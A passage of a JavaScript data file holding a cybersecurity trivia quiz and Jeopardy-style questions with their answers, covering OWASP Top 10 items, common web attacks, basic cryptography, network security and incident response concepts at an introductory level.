      { id: 4, q: "What does Telnet do insecurely?", a: ["Sends all data in plaintext","Uses weak encryption","Requires no password","Compresses data"], correct: 0, explanation: "Telnet transmits all data including passwords in plaintext (unencrypted)." },
      { id: 5, q: "What is the #1 item in OWASP Top 10 (2021)?", a: ["Injection","Broken Access Control","XSS","Cryptographic Failures"], correct: 1, explanation: "Broken Access Control is #1 in OWASP Top 10 2021." },
      { id: 6, q: "What is A03 in OWASP Top 10?", a: ["Cryptographic Failures","Injection","Broken Access Control","Security Misconfiguration"], correct: 1, explanation: "A03 is Injection (SQL injection, XSS, command injection, etc.)." },
      { id: 7, q: "What is Wireshark used for?", a: ["Password cracking","Network packet analysis","Encrypting files","Compiling code"], correct: 1, explanation: "Wireshark captures and analyzes network packets (PCAP files)." },
      { id: 8, q: "What is defense in depth?", a: ["Single strong security control","Multiple layers of security controls","Using strong passwords only","Disabling all network access"], correct: 1, explanation: "Defense in depth uses multiple layers of security so failure of one doesn't compromise the system." },
      { id: 9, q: "What is the principle of least privilege?", a: ["Grant maximum access by default","Grant minimum necessary access","Only admins have access","No one has access"], correct: 1, explanation: "Least privilege means granting only the minimum access needed to perform a task." },
      { id: 10, q: "What is security misconfiguration?", a: ["Running production with DEBUG=True","Using strong encryption","Implementing firewalls","Enabling MFA"], correct: 0, explanation: "Security misconfiguration includes insecure defaults like DEBUG mode, default credentials, etc." }
    ]
  }
};

const JEOPARDY_QUESTIONS = [
  // Web Hacking
  { id: 1, category: "Web Hacking", points: 100, question: "What does SQL injection target?", answer: "database queries" },
  { id: 2, category: "Web Hacking", points: 200, question: "Name two types of XSS.", answer: "reflected and stored" },
  { id: 3, category: "Web Hacking", points: 300, question: "What is CSRF?", answer: "cross-site request forgery" },
  { id: 4, category: "Web Hacking", points: 400, question: "Explain IDOR with an example.", answer: "accessing /user/2 when you should only access /user/1" },
  { id: 5, category: "Web Hacking", points: 500, question: "How does blind SQL injection work?", answer: "using time delays or boolean responses to infer data" },
  // Cryptography
  { id: 6, category: "Cryptography", points: 100, question: "What does Base64 encode?", answer: "binary data to ascii text" },
  { id: 7, category: "Cryptography", points: 200, question: "Decode this ROT13: SYNT", answer: "flag" },
  { id: 8, category: "Cryptography", points: 300, question: "What is a hash function used for?", answer: "one-way transformation for integrity checks" },
  { id: 9, category: "Cryptography", points: 400, question: "Difference between encoding and encryption?", answer: "encryption requires a key, encoding doesn't" },
  { id: 10, category: "Cryptography", points: 500, question: "How does RSA encryption work?", answer: "public key encrypts, private key decrypts using large prime numbers" },
  // Network Security
  { id: 11, category: "Network Security", points: 100, question: "What port does HTTP use?", answer: "80" },
  { id: 12, category: "Network Security", points: 200, question: "What does a firewall do?", answer: "filters network traffic based on rules" },
  { id: 13, category: "Network Security", points: 300, question: "What Wireshark filter shows only HTTP traffic?", answer: "http" },
  { id: 14, category: "Network Security", points: 400, question: "What is a subnet mask?", answer: "divides ip addresses into network and host portions" },
  { id: 15, category: "Network Security", points: 500, question: "What is a man-in-the-middle attack?", answer: "intercepting communication between two parties" },
  // OWASP
  { id: 16, category: "OWASP", points: 100, question: "What is OWASP Top 1 (2021)?", answer: "broken access control" },
  { id: 17, category: "OWASP", points: 200, question: "What is A03 in OWASP Top 10?", answer: "injection" },
  { id: 18, category: "OWASP", points: 300, question: "What is A05 in OWASP Top 10?", answer: "security misconfiguration" },
  { id: 19, category: "OWASP", points: 400, question: "What is broken authentication?", answer: "weak session management or credential storage" },
  { id: 20, category: "OWASP", points: 500, question: "How do you prevent injection attacks?", answer: "use parameterized queries and input validation" },
  // Security Basics
  { id: 21, category: "Security Basics", points: 100, question: "What is a data breach?", answer: "unauthorized access to sensitive data" },
  { id: 22, category: "Security Basics", points: 200, question: "What is an IOC?", answer: "indicator of compromise" },
  { id: 23, category: "Security Basics", points: 300, question: "Name the incident response phases.", answer: "preparation, detection, containment, eradication, recovery, lessons learned" },
  { id: 24, category: "Security Basics", points: 400, question: "What is a SIEM?", answer: "security information and event management system" },
  { id: 25, category: "Security Basics", points: 500, question: "What is the Cyber Kill Chain?", answer: "stages of a cyberattack from reconnaissance to actions on objectives" }
];

const JEOPARDY_CATEGORIES = ["Web Hacking", "Cryptography", "Network Security", "OWASP", "Security Basics"];
const JEOPARDY_POINTS = [100, 200, 300, 400, 500];
